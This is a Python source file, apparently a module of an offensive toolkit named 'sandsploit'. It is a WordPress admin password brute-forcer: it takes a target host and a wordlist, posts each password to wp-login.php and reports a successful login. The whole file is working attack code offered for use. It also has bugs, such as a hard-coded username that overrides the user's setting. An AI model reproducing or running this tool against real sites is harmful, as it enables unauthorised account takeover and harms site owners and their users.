#!/usr/bin/python3
import requests , sys
from colorama import Fore
import subprocess
uname =  subprocess.check_output("uname -o", shell=True)
if 'Android' in str(uname):
    sys.path.append("/data/data/com.termux/files/usr/opt/sandsploit/core")
else:
    sys.path.append("/opt/sandsploit/lib/")
import complator
name = "Wordpress Cracker"
author = "@Aμιρ-0x0 (AMJ)"
info = "a Tool for Cracking WP Admin User...."
host = None
username = None
passlist = None
def help():
    print ("author              to show author name")
    print ("help                to show this massage")
    print ("info                To show description of the tool ")
    print ("set                 to set options such as : [set host http://google.com/]")
    print ("show_options        to show options of Tools")
    print ("exit                to quit from Tool")
def options():
    print ("options               value")
    print ("==========            ============")
    print ("host                  ",host)
    print ("username              ",username)
    print ("passlist              ",passlist)
    print("\n\033[95mYou Must Enter URL with Protocol (Example : https://site.com or http://site.com)")
    print("\033[95mYou Must Write / at The End of URL EX: www.site.com/")
    print("\033[95mThe Password list must be addressed from the root directory EX:'/home/USER/Desktop/pass.txt'")

def run():
    wp_login = host+'/wp-login.php'
    wp_admin = 'http://%s/wp-admin/'%(host)
    username = 'auip' 
    
    pwo = open(passlist,'r')
    with requests.Session() as s:
        headers1 = { 'Cookie':'wordpress_test_cookie=WP Cookie check' }
        for i in pwo :
            try:
                passl = i.strip('\n\r')

                datas={ 
                    'log':username, 'pwd':passl, 'wp-submit':'Log In', 
                    'redirect_to':wp_admin, 'testcookie':'1'  
                }
                r = s.post(wp_login, headers=headers1, data=datas)
                check = r.text
                if "https://wordpress.org/news/" in check:
                    
                    print (Fore.GREEN+"========================================\nUsername : %s \nPassword : %s"%(username,passl))
                    break
                else:
                    print (Fore.RED+"Password incorrect : %s"%passl)
            except:
                print ("Check Internet or Target......")

while True:
    
        option = input ("\033[96m┌─[SSF][\033[91m"+name+"\033[96m]\n└─▪ ")
        op2 = option.split(" ")
        if option == "help":
            help()
        elif option == "author":
            print (author)
        elif option == "info":
            print (info)

        elif option == "show_options":
            options()
        elif op2[0] == "set":
            if op2[1] == "host":
                host = op2[2]
            elif op2[1] == "username":
                username = op2[2]
            elif op2[1] == "passlist":
                passlist = op2[2]
        elif option == "run":
            run()
        elif option == "exit":
            break
        else:
            print ("Wrong Command ! ")
